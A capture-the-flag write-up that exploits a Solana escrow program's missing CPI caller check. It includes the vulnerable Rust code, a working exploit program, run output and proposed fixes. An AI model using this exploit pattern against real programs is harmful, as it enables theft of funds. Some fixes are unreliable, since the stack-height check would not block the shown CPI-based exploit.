# Solution: Escrow Bypass

## Vulnerability Analysis

The vulnerability is a **CPI Authorization Bypass** where the program checks if an account matches an expected pubkey but doesn't verify the actual caller in the execution stack.

### The Vulnerable Code

In `program/src/processor.rs`, the `process_release` function:

```rust
fn process_release(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    let escrow_account = next_account_info(account_info_iter)?;
    let recipient_account = next_account_info(account_info_iter)?;
    let authority_program = next_account_info(account_info_iter)?;

    // ... validation code ...

    let mut escrow_data = Escrow::try_from_slice(&escrow_account.data.borrow())?;

    // VULNERABILITY: Only checks if the account pubkey matches!
    if escrow_data.authority_program != Pubkey::default() {
        if escrow_data.authority_program != *authority_program.key {
            msg!("Invalid authority program");
            return Err(ProgramError::InvalidAccountData);
        }
        // Missing: Verification that authority_program is the CALLER
        // Should use: solana_program::program::get_stack_height()
    }

    // Transfer funds without proper authorization check
    **escrow_account.lamports.borrow_mut() = 0;
    **recipient_account.lamports.borrow_mut() += escrow_lamports;
    
    Ok(())
}
```

### The Problem

1. **Account Presence ≠ Caller Identity:** The code checks if `authority_program.key` matches the stored pubkey
2. **No Stack Verification:** It doesn't verify that `authority_program` is actually calling this instruction
3. **Direct Invocation Possible:** An attacker can call `Release` directly and pass any account as the authority parameter

### Understanding CPI Authorization

In Solana:
- **CPI (Cross-Program Invocation):** One program calling another program
- **Proper Authorization:** Verify the **calling program** is authorized, not just an account parameter
- **Stack Height:** Use `solana_program::program::get_stack_height()` to verify execution context

## Exploitation

### Step 1: Understanding the Attack

The escrow expects to be released via CPI from an authorized program, but it only checks if we **provide** that program's pubkey as an account. We can:

1. Call `Release` directly from our exploit program
2. Pass the `authority_program` account as a parameter
3. Specify ourselves as the recipient
4. Bypass the authorization check

### Step 2: Implementing the Exploit

Create a solve program that directly invokes the Release instruction:

```rust
// solve/src/processor.rs
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    pubkey::Pubkey,
    instruction::{AccountMeta, Instruction},
};
use borsh::BorshSerialize;

#[derive(BorshSerialize)]
pub enum EscrowInstruction {
    Initialize { amount: u64 },
    Release,
    Cancel,
}

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("Exploit starting...");
    
    let account_info_iter = &mut accounts.iter();
    let user_account = next_account_info(account_info_iter)?;
    let escrow_program = next_account_info(account_info_iter)?;
    let escrow_pda = next_account_info(account_info_iter)?;
    let admin_account = next_account_info(account_info_iter)?;
    let authority_program = next_account_info(account_info_iter)?;
    
    // Call Release with ourselves as the recipient
    let release_instruction = Instruction {
        program_id: *escrow_program.key,
        accounts: vec![
            AccountMeta::new(*escrow_pda.key, false),
            AccountMeta::new(*user_account.key, false),  // Recipient = us!
            AccountMeta::new(*authority_program.key, false),  // Just pass the account
        ],
        data: EscrowInstruction::Release.try_to_vec().unwrap(),
    };
    
    invoke(
        &release_instruction,
        &[escrow_pda.clone(), user_account.clone(), authority_program.clone()],
    )?;
    
    msg!("Exploit successful!");
    Ok(())
}
```

### Step 3: Building and Running

```bash
# Build the solve program
cd solve
cargo build-sbf

# Run the exploit
cd ..
python3 solve.py localhost 5005
```

### Expected Output

```
[*] Connecting to challenge server...
[+] Connected!

╔════════════════════════════════════════════════╗
║        H7CTF 2025 - Escrow Bypass              ║
║                                                ║
║  A secure escrow holds 50 SOL for release...  ║
║  Can you bypass the authorization checks?     ║
╚════════════════════════════════════════════════╝

...

[*] Running your exploit program...

Program log: Exploit starting...
Program log: Instruction: Release
Program log: Escrow released: 51000000000 lamports to recipient

[*] Exploit execution complete.
[*] Checking win condition...

═══════════════════════════════════════════════
Final State:
  Your Balance: 56 SOL
  Stolen: 51 SOL
  Required: 45 SOL
═══════════════════════════════════════════════

[+] Success! You bypassed the authorization.
[+] Flag: H7CTF{cp1_4uth0r1z4t10n_byp4ss_n0_st4ck_ch3ck_<UUID>}
```

## Mitigation

### Fix #1: Verify Caller Program ID

The proper way is to verify that the instruction is being called via CPI from the expected program. However, Solana doesn't expose a direct "caller program ID" API. Best approach is to use anchor framework or implement a callback pattern.

### Fix #2: Remove Direct Call Support

```rust
fn process_release(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {
    // ... validation code ...
    
    // FIX: Check stack height to ensure CPI
    let stack_height = solana_program::program::get_stack_height();
    if stack_height <= 1 {
        msg!("Release can only be called via CPI");
        return Err(ProgramError::InvalidInstructionData);
    }
    
    // Additional checks...
    Ok(())
}
```

### Fix #3: Use Anchor Framework

Anchor provides better CPI authorization with `#[account]` constraints:

```rust
#[derive(Accounts)]
pub struct Release<'info> {
    #[account(mut, has_one = authority_program)]
    pub escrow: Account<'info, Escrow>,
    
    #[account(mut)]
    pub recipient: SystemAccount<'info>,
    
    /// CHECK: This should be verified via CPI context
    pub authority_program: UncheckedAccount<'info>,
}
```

### Fix #4: Signature-Based Authorization

Instead of program-based auth, require a signature from a specific authority keypair:

```rust
fn process_release(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    let escrow_account = next_account_info(account_info_iter)?;
    let recipient_account = next_account_info(account_info_iter)?;
    let authority_signer = next_account_info(account_info_iter)?;  // Changed
    
    let escrow_data = Escrow::try_from_slice(&escrow_account.data.borrow())?;
    
    // FIX: Check for actual signature
    if !authority_signer.is_signer {
        msg!("Authority must sign");
        return Err(ProgramError::MissingRequiredSignature);
    }
    
    if escrow_data.authority != *authority_signer.key {
        msg!("Invalid authority");
        return Err(ProgramError::InvalidAccountData);
    }
    
    // Safe to proceed...
    Ok(())
}
```

## Key Takeaways

1. **Account presence ≠ Authorization:** Just because an account is passed doesn't mean it's the caller
2. **CPI context matters:** Verify execution context when restricting operations to CPIs
3. **Stack height checks:** Use `get_stack_height()` to detect direct vs CPI invocations
4. **Use frameworks:** Anchor provides better abstractions for CPI authorization
5. **Prefer signatures:** When possible, use signature-based auth instead of program-based

## Real-World Impact

Similar vulnerabilities have affected:
- Escrow and custody programs with inadequate CPI checks
- DeFi protocols with cross-program authorization
- Programs assuming account presence implies authorization

Always validate the **execution context**, not just account parameters!
